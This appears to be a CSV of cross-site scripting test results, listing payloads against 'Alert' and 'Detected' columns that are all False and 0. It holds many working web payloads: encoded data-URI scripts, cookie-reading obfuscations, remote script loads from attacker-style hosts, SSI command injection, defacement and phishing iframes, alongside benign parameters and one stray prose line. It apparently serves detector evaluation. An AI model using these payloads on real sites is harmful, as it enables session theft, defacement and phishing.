Payload,Alert,Detected
onselectionchange,False,0
"<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a>",False,0
onbeforecopy,False,0
"bo_table=News&wr_id=122&sca=%22%3E%3Cobject%20data=data:<br/>text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%20%22",False,0
"data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==",False,0
onmouseleave,False,0
"Cat=Archivio&Tipo="">%3Cimg%20src=""http://www.bloggers.it/a<br/>ntifaunipd/itcommenti/ANTIFA%20ITALIANO2.jpg""%20/>&IdTipo=14",False,0
"url=url=data:text/html;charset=utf-7;base64,K0FEdy1zY3<br/>JpcHQrQUQ0LWFsZXJ0KDEpK0FEcy1oaXN0b3J5LmJhY2soKStBRHNBUEEtL3NjcmlwdCtBRDQt&referer=http://surveylink<br/>.yahoo.com/wix/p2223931.aspx?url=data:text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWFsZXJ0KDE<br/>pK0FEcy1oaXN0b3J5LmJhY2soKStBRHNBUEEtL3NjcmlwdCtBRDQt",False,0
"<div id=""53""><xml id=""xss"" src=""test.htc""></xml>",False,0
&LT,False,0
clickTag=http://xssed.com,False,0
"action=search&allField='""--></style></script><a<br/>href=""http://www.twitter.com/dglife"">My Twitter @Dglife</a><iframe<br/>src=""http://a2.twimg.com/profile_images/371529719/gostosao_normal.jpg"">",False,0
search=%27%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
lid=0&tid=2&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Code<br/>%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
"window['alXert’ .replace(/X/, "")|(self[document'][cookie'])",False,0
uvx=8IK7UhCn9Za7nEahBteY3JpE-O10jiVKvcQ4UopeVvITXYtijoF6DehOMjnS<br/>piMShvyMW5bDlLwWrj1BNFgmwBdm347VXAKU,False,0
userName=%3Ciframe+src%3Dhttp%3A%2F%2Fxssed.com%2F%3E&p<br/>assword=&Login=Login...,False,0
nats=%22%3E%3Ciframe%20src=http://hypnozhack.org/hac<br/>ked/%3E,False,0
who=%3Cimg%20src=%22http://rmccurdy.com/public_images/H4<br/>CK3R54F3.jpg%22%3E,False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=com_content&<br/>user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.com/,False,0
url=www%2Egoogle%2Ecom&returl=http%3a%2f%2fwww%2eyahoo%2ecom,False,0
lid=bg&tid=default&f_user=&six=&f_email==%22%3E%3Ch1%3ENull<br/>%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
lank=http://uber0n.darkillusion.org/xsspage.htm&id=19&rub=meny&text=<br/>Menyalternativ,False,0
"<style>:target {color: red;}</style><track id=x style=""transition:color 10s"" ontransitioncancel=print()></track>",False,0
s=9d18cf5ead91a1afd7da9c1f5fecc48c,False,0
s=False&reDir=http://xssed.com,False,0
URLPage=http://vuln.xssed.net/thirdparty/scripts/pyth<br/>on5.html,False,0
q=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNET+SECURITY+BY+CHEROKEE+<br/>WARRIOR%3C%2Fh1%3E%3C%2Fmarquee%3E&site=jfkltest&client=jfkltest&output=xml_no_dtd&oe=utf8&getfields<br/>=%2A&partialfields=&SearchType=basic&btnG.x=0&btnG.y=0,False,0
category=%22%3E%3Ciframe%20src=http://droptix.viralcod<br/>ers.com/xss.php%20width=800%20height=333%20style=position:absolute;top:0;left:0%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><ins id=x style=""transition:transform 2s"" ontransitionrun=print()></ins>",False,0
siteSearch2='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarq<br/>uee%3EWhiteHat%20Forever%3C/marque%3E,False,0
main_page=page_2,False,0
Textarea=%3Ch1%3EHacked%20by%20Janizary%20Er%20Meydani<br/>%20Tim%3C/h1%3E,False,0
sys=whv&r=%22%3E%3Cbr/%3E%3Ciframe%20src=http://c1<br/>c4tr1z.blogspot.com/%3E,False,0
langue=fr_FR&noLTList=@MaKyOtOx%0A%3Ciframe%20src=%22http://<br/>xssed.com%22%3E,False,0
appRedirect=http://google.com,False,0
URL=http://www.nullflow.com/xss/xss.php,False,0
message=%3Ch1%3E%3Cmarquee%3EDisgusting%20porno%20<br/>bastards%3C/marquee%3E%3C/h1%3E,False,0
system=PUBLIC&event=PUBLIC_DD&URL_Link=http://goog<br/>le.fr,False,0
"ID=144092&A=1&L=109633&C=5531&P=<br/>4543&T=I&BOUNCE=OK&brnd=39765&URL=data:text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWFsZXJ0KD<br/>EpK0FEcy1oaXN0b3J5LmJhY2soKStBRHNBUEEtL3NjcmlwdCtBRDQt",False,0
SQ=&TT=1&QT=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNET+<br/>SECURITY+BY+CHEROKEE+WARRIOR%3C%2Fh1%3E%3C%2Fmarquee%3E&searchbtn=Search,False,0
"'';!--""<xss>=&{()}",False,0
"search=Yes&searchstring=""><marquee><h1>AZAT WAS HERE<br/>;]</h1></marquee>",False,0
"<div id=""94""><svg xmlns=""http://www.w3.org/2000/svg"">",False,0
"<!--#execcmd=""/bin/echo '<SCR'""--><!--#execcmd=""/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'""-->",False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=com_cont<br/>ent&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.co<br/>m,False,0
http://whk.sitehacking.net,False,0
"<EMBED SRC=""http://hacker.com/xss.swf"" AllowScriptAccess=""always"">",False,0
url=%3Cfont%20size=7%3EDaiMon,False,0
file=http://www.xssed.com,False,0
Centro=http://xssed.com,False,0
searchtype=1&LGSL=t&mode=1.1&text=%22%3E%3C<br/>center%3E%3Ch1%3E%3CBR%3EXSS+FLAW%3Ccomment%3E,False,0
onblur,False,0
keys='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmar<br/>quee%3EWhiteHat%20Forever%3C/marque%3E,False,0
cmd=_mpi-click-outside&uid=&campaign_id=604&offer_id=775&landi<br/>ng_url=http://rstzone.org,False,0
_DARGS=/find-a-store/en/index_content.jsp,False,0
2007sp-cococmp-000?http://kusomiso.com,False,0
"<style>:target {color: red;}</style><map id=x style=""transition:color 10s"" ontransitioncancel=print()></map>",False,0
http://vuln.xssed.net/thirdparty/scripts/ckers.org.html,False,0
name=Submit_News,False,0
sayfa=whois,False,0
"""data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4="">",False,0
"town=<iframe src=""http://xssed.com""></iframe>",False,0
a=”Fun”;b=”ction”;c=”ev”;d=”al(a”;e=”tob”;f=”(‘YWxlcnQoMSk=’))”;self[a+b](c+d+e+f)();,False,0
articleid=2725,False,0
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1<br/>%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
searchString=%22%3E%3Cfont%20size=18%3EAn<br/>other%20Hacker%20Safe%20web%20with%20no%20safety..%20XSS%20by%20C1c4Tr1Z%3C/font%3E&x=0&y=0,False,0
"';globalThis['\x65\x76\x61\x6c']('globalThis[""\x61\x6c\x65\x72\x74""](globalThis[""\x61\x74\x6f\x62""](""WFNT""))');//",False,0
tsearch=%27%3C/script%3E%3Ciframe%20src=http://www.xssed.org%3E<br/>&x=0&y=0,False,0
url=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
bandeau=/energie/anglais/be_us.h<br/>tm&gauche=/energie/anglais/me_us.htm&droite=http://xssed.com/,False,0
redirect=http://google.org,False,0
s=0%3B+URL%3Dhttp%3A%2F%2Fwww.google.com%22+HTTP-EQUIV%3D%22R<br/>efresh&search.x=32&search.y=6&search=Search,False,0
token_url=http://google.com,False,0
"<style>:target {transform: rotate(180deg);}</style><form id=x style=""transition:transform 2s"" ontransitionrun=print()></form>",False,0
id=58&posted=true,False,0
"<style>:target {transform: rotate(180deg);}</style><marquee id=x style=""transition:transform 2s"" ontransitionrun=print()></marquee>",False,0
2007.10.10.8.17.32.765&clickTA<br/>G=http://kusomiso.com,False,0
"<div id=""132""><!doctype html>",False,0
validate=ok,False,0
"javas%09cript:ghi=%27)%3E%27,you=%27(top%5B%22docum%22%2B%22ent%22%5D.cookie%27;HTMLElement%5B%27inne%27%2B%27rHTML%27%5D=%27%3CSvg/OnLoad=alert%27%2Brob%2Beco;//",False,0
new=1&word='%22%3E%3Ciframe%20src=http://33272<br/>30308%3E&section=0&version=niv&language=en,False,0
page=%22'%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueballr%3C/strong<br/>%3E%3C/h1%3E%3C/marquee%3E,False,0
mobile=true,False,0
onsubmit,False,0
print=%22%20style=-moz-binding:url(http://zucker.schokokeks.org/~lars/xss/<br/>username.xml%23username)%20style=%22,False,0
this['alert'](),False,0
%3Chtml%0aonmouseOver%0a=%0a(prompt)``//,False,0
\74k<K/contentEditable/autoFocus/OnFocus=,False,0
tid=%3Ch1%3E%3Ca%20href=http://www.darkmindz.com%3EDarkMi<br/>ndZ%3C/a%3E%3C/h1%3E,False,0
http://www.xssed.com,False,0
KONTO=%22%3E%3Ciframe%20src=http://www.google.de%3E,False,0
keywords=%3Cmarquee%3Epwnd%3C/marquee%3E%3Cifra<br/>me%20src=http://xssed.com%3E&script_type=&order_by=rating&direction=descending&search=search,False,0
mode=main&fcst=fnak53pafg.am&area=Interior&time<br/>=<iframe%20src=//google.com>,False,0
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=print()></input>",False,0
c=188488&p=irol-alertsLong&t=AlertPost,False,0
nl=5_Sep18&adUrl=http://www.xssed.com,False,0
</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>,False,0
dksmkey=zbxwaw3k,False,0
"<style>:target {color: red;}</style><area id=x style=""transition:color 10s"" ontransitioncancel=print()></area>",False,0
page=%22%3E%3Ciframe%20src%3Dhttp://www.ba<br/>seportal.com/baseportal/bankphish/_XSS%3E%3C/iframe%3E,False,0
"did=""><h1>xss</h1>",False,0
nforo=237,False,0
"_nfpb=true&_pageLabel=not&url=42454""><h1><br>XSS%20by%20WHK<br>""><br/><iframe src=http://xssed.com>",False,0
advRegion=8&q=%22%3E%3Cimg%20src=%22http://img152.images<br/>hack.us/img152/7032/xssximagesd8.jpg%22%3E,False,0
"<circle fill=""red"" r=""40""></circle>",False,0
"searchcriteria=directories.headline&searchtex<br/>t=""'><iframe%20src=http://xssed.com>",False,0
s=0&vid=380&a=000349&s=RB&p=005&b=%22%3E%3Ciframe%20src=<br/>http://pc-kopat.us/hacked/%3E,False,0
nats=JyI+PC90aXRsZT48c2NyaXB0PmFsZXJ0KDEzMzcpPC9zY3JpcH<br/>Q+PjxtYXJxdWVlPjxoMT5YWUxJ,False,0
"{{constructor.constructor(valueOf.name.constructor.fromCharCode(97,108,101,114,116,40,49,41,10))()}}",False,0
bannerSrc=/images/banners/flash/468x60_EMEAfinan<br/>ce3.swf&clickTag=http://lotion.110mb.com,False,0
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",False,0
"threadprefix=""></a><marquee>PaPPy_was_here</marquee>",False,0
"< STYLE=""behavior: url(.htc);"">",False,0
id=0&location=2,False,0
to=PEJPRFkgb25sb2FkPSJhbGVydCgnc2hlbGxjMGRlJyk7Ij4=&ID=1,False,0
"exp/*<AnonKryptiQuz STYLE='no\xss:noxss(""*//*"");",False,0
q=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/css<br/>%20rel=stylesheet%3E,False,0
option=com_content&user_rating=1&submit_vote=index2.ph<br/>p?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&ur<br/>l=http://xssed.com,False,0
onReverse,False,0
lang=se&ref=http://uber0n.darkillusion.org/xsspage.htm,False,0
"<A HREF=""http://66.102.7.147/""></A>",False,0
dksmkey=yl7bnz6g,False,0
p=http%3A%2F%2Fwww.huifa.cl%2Fbuscad<br/>or%2Fbuscar.php%3F%26cod_rubro%3D%26cb%3D%26criterio%3D%3C%2Ftitle%3E%3Ch1%3E%3Cmarquee%3Exss.here-x<br/>ss.here-xss.here-xss.here-xss.herexss.here-xss.here-xss.here-xss.here-xss.here%3C%2Fmarquee%3E%3C%2F<br/>h1%3E%3Ctitle%3E&ei=UTF-8&fr=sfp&x=wrt&meta=vl%3D,False,0
by=LN&val=%3Ciframe%20src=%22http://xssed.com<br/>%22%3E,False,0
"id=22""<iframe/src=http://xssed.co<br/>m>",False,0
"<style>:target {color: red;}</style><ins id=x style=""transition:color 10s"" ontransitioncancel=print()></ins>",False,0
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://www.securitycompass.com/scriptlet.html""></object>",False,0
onCellChange,False,0
keyword='%3E%3E%3Cmarquee%3E%3Ch1%3EXSSED%3C/h1<br/>%3E%3C/marquee%3E,False,0
<h1>Drop me</h1>,False,0
bannerid=46&zoneid=0&source=&dest=http://uber0n.darkillusion.org/x<br/>sspage.htm,False,0
do=search&search=%22%3E%3Cmarquee%3E%3Ch1%3Ek1ll3r_null%20was%20<br/>here%3C/h1%3E%3C/marquee%3E%3Ciframe+src%3D%22http%3A%2F%2Fwww.xssed.com%22%3E%3C%2Fiframe%3E,False,0
x-redirect=%22%3E%3Ciframe%20src=http://hypnozhack.o<br/>rg/hacked/%3E,False,0
edit,False,0
127@49.JGmEcWfStXv.12@.bebc200,False,0
REF='><iframe%20src=http://google.com>,False,0
option=com_content&user_rating=1&submit_vote=index2.php?opti<br/>on=com_content&user_rating=1&submit_vote=x&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.com,False,0
url=http%3A%2F%2Fwww.r3t.n3t.nl%2Fmain%2Fcontent%2Fv<br/>iew%2F1186,False,0
"<style>:target {transform: rotate(180deg);}</style><header id=x style=""transition:transform 2s"" ontransitionrun=print()></header>",False,0
onDragDrop,False,0
BUSCADOR=%22%3E%3Cmarquee%3EDEFACED%20BY%20SPONSFULL%3C/marquee%3E,False,0
"obj=com&tbl=""><h1>Null%20Code%20Services</h1><iframe%20sr<br/>c=http://www.google.com.ar%20width=717%20height=274></iframe>",False,0
S=%3Ciframe/src%3D//bbc.co.uk%3E%3C/iframe%3E%3Ciframe/src%3D//<br/>youtube.com%3E&DM=20,False,0
Keywords=%3Ch1%3E%3Cp%20align=center%3EHacked!%3C/h1%3E%3Cp%20<br/>align=center%3E%3Cmarquee%3E%3Cplaintext%3E&Search.x=0&Search.y=0,False,0
fobjectid=751,False,0
id=182&event1=b%2B&event2=click&goto=http://uber0n.darkillus<br/>ion.org/xsspage.htm,False,0
language=en,False,0
STARTID=CLIP_NAVCHANNEL_3282_06&PAGE=0081&URL=http://xss<br/>ed.com,False,0
q=http%3a%2f%2fwww.xssed.com,False,0
"<import namespace=""t"" implementation=""#default#time2"">",False,0
pid=10&SECTION=user;ACTION=single;USERID=50057&PHPSESSID=6b0e52ae840c2<br/>...,False,0
"<style>:target {transform: rotate(180deg);}</style><animate id=x style=""transition:transform 2s"" ontransitionrun=print()></animate>",False,0
"session=';//\';//""//\""//--></SCRIPT>"">'><IFRAM<br/>E SRC=http://xss.exofire.net/x/ WIDTH=1024 HEIGHT=860>",False,0
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D""></A>",False,0
onpointerrawupdate,False,0
lid=de&tid=modern_blue&f_user=&six=&f_email=<br/>=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/if<br/>rame%3E,False,0
&#X003c,False,0
<div style=content:url(test2.svg)></div>,False,0
page=articles&rub=%27%22%3E%3Cmarquee%3EXSS%20by%20SylTroX%3Ciframe%20sr<br/>c=%27http://xssed.com%27/%3E,False,0
http://vuln.xssed.net/thirdparty/scripts/python5.h<br/>tml,False,0
"<style>:target {transform: rotate(180deg);}</style><acronym id=x style=""transition:transform 2s"" ontransitionrun=print()></acronym>",False,0
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;AnonKryptiQuz&lt;/A&gt;",False,0
"data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",False,0
F=sok,False,0
"<style>:target {transform: rotate(180deg);}</style><dd id=x style=""transition:transform 2s"" ontransitionrun=print()></dd>",False,0
error=%3Ciframe%20src=%22http://xssed.com%22<br/>%3E,False,0
q=%22%3E%3Cfont+size%3D%2211%22%3E%3Ccenter%3EHacking+<br/>Gurus%3C%2Fcenter%3E%3C%2Ffont%3E%3Cbr%3E%3Cmarquee%3EDont+Mess+With+Us%3C%2Fmarquee%3E,False,0
b=69&url=http://www.xssed.com/,False,0
"Search=""><marquee>PaPPy Was here</marquee><!--",False,0
"forumid=""><h1>Xss%20By%20Narcoticxs</h1>><marquee><h1>By+Narco<br/>ticxs</h1></marquee>",False,0
"<style>:target {transform: rotate(180deg);}</style><var id=x style=""transition:transform 2s"" ontransitionrun=print()></var>",False,0
"d=actu&p=actu&id=3442""/><iframe  src=""http://xssed.com"">",False,0
lid=he&tid=beauvoir&f_user=&six=&f_email==%22%3E%3Ch1%3ENul<br/>l%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
lang=es&art=limpress&special= --><h1>XSS</h1>,False,0
"This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal<IMG SRC=""httx://badguy.com/a.jpg"">could actually be an attack vector to run commands as the user who views the image link. Here is the.htaccess(under Apache) line to accomplish the vector:",False,0
cmd=hit&id=kusomiso.com&channel=wdc_home&url=http://kusomiso.com,False,0
x=0&y=0&site=default_collection&num=10&filter=0&<br/>q=%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
url=%22%3E%3Ch1%3EXSS%20by%20C1c4Tr1Z!%3C/h1%3E%3Ciframe%20src=h<br/>ttp://xssed.com%3E,False,0
page=http://www.googlebig.com,False,0
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",False,0
"<;SCRIPT a=`>;` SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",False,0
page=register,False,0
"&ctportalnav=|27190|&dln=''""""/><img scr=sxx! />",False,0
"&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;",False,0
distance=50&Search=%22%3E%3Cimg+src%3Dhttp%3A%2F%2Fimg257.im<br/>ageshack.us%2Fimg257%2F3733%2F77822687.png%3E%3C%22&find=Search,False,0
context=<iframe+src=http://www.google.com></iframe>,False,0
pagina=nieuws&meer_id=83,False,0
r=1,False,0
hl=es&q=site:http://www.xssed.com/&btnI,False,0
\”}})})-confirm`AnonKryptiQuz`(a=>{({b:{/*///,False,0
q=%3Cmarquee%3Ewhere%3C/marquee%3E,False,0
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,False,0
event=processform&name=flashlite,False,0
url=http://www.geocities.com/pinkelephant2k7/stallow<br/>ned.html,False,0
url=%0AContent-Type:%20text/html%0AContent-Length:%20<br/>13%0A%0AKr3w%20was%20here,False,0
onSelect,False,0
query_string=%22%3E%3Cimg+src%3D%22http%3A%2F%2Fquaigy.free.fr%2Fb<br/>ordel%2Fowned.jpg&x=0&y=0,False,0
&#x000003c;,False,0
27269,False,0
RequestedUrl=..%2fHome%2fDefault.aspx,False,0
file=html/%22$this-%3Eusername%22%3Ciframe%20src=%22http://xssed.co<br/>m%22%3E/help/filexp.html&FirstLoad=1&HelpFile=loginhelp.html,False,0
keywords=%3Cstyle%3EBody{background-color:black;c<br/>olor:white;font:50px%20arial;}%3C/style%3E%3Ch1%3EBY%20ST@rEXT%3E%3Cmarquee%3EWhiteHat+Forever+BY%20<br/>St@rExT%3C%2F,False,0
http://www.googlebig.com,False,0
opt=search&search=%22%3E%3C/head%3E%3Cbody%3E%3Ccenter%3E%3Ca%20href=%22htt<br/>p://www.spyrozone.net/%22%3E%3Cimg%20border=%220%22%20src=%22http://www.spyrozone.net/playground/xss<br/>edbyspyrozone.net.png%22%3E%3C/a%3E%3Cbr%3E%3Ciframe%20width=800%20height=600%20src=http://www.spyro<br/>zone.net%3E%3C/iframe%3E%3C/center%3E%3C/body%3E%3Cnoscript%3E&x=0&y=0&lang=1,False,0
destUrl=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
q=__22__3E__3Ciframe-src__3D__22http__3A__2F__2Fxssed.com__22__3E&<br/>cy=ca,False,0
lid=pt&tid=modern_blue&f_user=&six=&f_email=<br/>=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/if<br/>rame%3E,False,0
zoom_query=%22%3E%3Ciframe%20src=%22http://xss<br/>ed.com%22%3E,False,0
q=%3Chtml%3E%3Cbody%3E%3CIMG+SRC%3D%22http%3A%2F%2Fimg.qj.net%2Fupl<br/>oads%2Farticles_module2%2F73630%2FHacked_qjpreviewth.jpg%22%3E%3C%2Fbody%3E%3C%2Fhtml%3E,False,0
pageno=56%22%3E%3Ch1%3E%3Ciframe%20src=http://www.xssed.com<br/>%3E,False,0
l=0.2.0.4386.81699&u=out.php?url=http://www.xssed<br/>.com,False,0
f=profile&l=havocxss,False,0
https://me6.com/aem/xss2.svg,False,0
cnt=showart&mode=search,False,0
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;,False,0
"clave=""><h1>Xss%20by%20n0b0dy</h1>",False,0
k=<title>xssed%20by%20winkick</title><h2>xssed%20by%20winkick<br/>;)</h2>,False,0
"<style>:target {transform: rotate(180deg);}</style><object id=x style=""transition:transform 2s"" ontransitionrun=print()></object>",False,0
fb_sig_locale=ja_JP&fb_sig_in_new_facebook=1&fb_sig<br/>_time=1256563191.8646&fb_sig_logged_out_facebook=1&fb_sig_added=0&fb_sig_api_key=02ca3e1c52d7abfb900<br/>53106b3d2f19e&fb_sig_app_id=7716435055&fb_sig=42fc63ee621f1e1daa4a6a467d918a44&search=%3Ca+href%3Dht<br/>tp%3A%2F%2Fgoogle.com%3E%22%3C%3Ciframe+src%3D%3E%3C%2Fscript%3E,False,0
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=print()></ol>",False,0
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;AnonKryptiQuz&lt;/A&gt;",False,0
pr=%3Ch1%3ERoMeO%20was%20here%20|%20DarkMindZ.com%3C/h1%3E%3Cimg%20<br/>src=http://www.darkmindz.com/img/aff.png%3E,False,0
id=http://r3t.n3t.nl,False,0
q=%3Ch1%3Exss+in+a+0day+search+engine%2C+Ironic%3Ch1%3E+&s=Search,False,0
campo=titolo&campo=testo_html&testo_ricerca=%22%3E%3Cimg+<br/>src%3D%22http%3A%2F%2Fimg96.imageshack.us%2Fimg96%2F8009%2Fxssks5.jpg%22%3E&image.x=15&image.y=18&ac<br/>t=src,False,0
onAfterPrint,False,0
id=http://www.diarioelargentino.com.ar/seccion.php?gru<br/>po=email@some%3Cmarquee%3E%3Ch1%3EXSS%20BY%20unGato%3C/h1%3E%3C/marquee%3Edomain.com&PHPSESSID=026c0<br/>0a12ca405679dd2d2d04333c99a,False,0
referrer=asdf%22%20style=%22-moz-binding:url(http://ha.ckers.org/x<br/>ssmoz.xml%23xss),False,0
onbeforeprint,False,0
keyword=%22%3E%3Ciframe%20src=http://googlebig.com%20heig<br/>ht=%22600%22%20width=%22800%22%3Eaaaaa&game=12&search_category=all&fields_name=1&fields_filename=1&s<br/>ort=name&order_in=asc&limit=25&outdated_in=0&descriptions_in=0&summary_in=0&show_screenshot_in=0,False,0
"'/*\'/*""/*\""/*`/*\`/*%26apos;)/*<!-->",False,0
fuseaction=classifieds.searchCategory&keyWord=%22%3E%3Ch1%3EMySpac<br/>e%20X%20SS%3C/h1%3E%3CA%20HREF=%22http://www.xssed.com/%22%3EXSS%20(Fake%20myspace.com%20login%20pag<br/>e)%3Cbr%3E%3Cimg%20src=%22http://img62.imageshack.us/img62/4615/stallowned3hb.jpg%22%3E%3C/A%3E%3Cbr<br/>%3E%3Cinput%20type=%22text%22%20value=%22Hexspirit%22%20/%3E%3Cbr%3E%3Cmarquee%3EROTFL!%20LMAO%3C?,False,0
urn=http://www.google.com,False,0
id=31,False,0
id=111&trade=http://www.xssed.com,False,0
page=answers&startover=y&locale=en&userlocale=EN_US&question=%3Cifr<br/>ame%20src%3Dhttp%3A%2F%2Fxssed.com%3E,False,0
destURL=http://www.r3t.n3t.nl/support/PrsCSrvGnl_EComm_S<br/>urvey.page&EMAIL_NO=13243636&PEIN=6025204&Cust_id=8658856&CMPNY=MOB&region=ON&language=en&myurl=CSQ&<br/>ADV=PM~11311sur~MECOMM&PMUID=PM~6025204~13243636~8658856~11311sur~MECOMM,False,0
qu=%22%3E%3Ciframe%20src%3Dhttp://www.baseportal.com/ba<br/>seportal/bankphish/_XSS%3E%3C/iframe%3E&x=0&y=0,False,0
<x </onxxx=1,False,0
db=1&t=%22%3E%3Ch1%3EXss+by+n0b0dy%3C%2Fh1%3E&td=todo,False,0
l=http://www.yahoo.com,False,0
buscador=%22%3E%3Ch1%3E%3Cmarquee%3EXssEd!&buscador_pna=&tipo_busqueda=0&bus<br/>cador_pnev=&cfg_objeto_aux=buscar,False,0
fa=1&code=21,False,0
category='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarqu<br/>ee%3EWhiteHat%20Forever%3C/marque%3E,False,0
"id=1221782862""><iframe/src=""http://xssed.com"">",False,0
search=%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
"exact=oui&pays=fr&reget=<iframe<br/>src=""http://xssed.com/"">&dept=Cantal&nodept=15&x=85&y=14",False,0
&#X0003C;,False,0
javacheck=false&command=login&logout=www2ftp.de/logout.<br/>html&server=&user=%3C/script%3E%3Ciframe%20src=http://kusomiso.com/xss.html%20%3C&password=&advanced<br/>=checked&port=21,False,0
show_id=646,False,0
txtROT13=%3C%2Fgrkgnern%3E%3Cfpevcg%3Enyreg%28qbphzr<br/>ag.pbbxvr%29%3B%3C%2Ffpevcg%3E%3Cgrkgnern%3E&btnCoder=kodieren,False,0
oninvalid,False,0
SearchText=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueba<br/>llr%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
"&lt;A HREF=\""htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\""&gt;XSS&lt;/A&gt;",False,0
nologin=1&referer=http://google.com,False,0
data=0&rurl=http://www.xssed.com,False,0
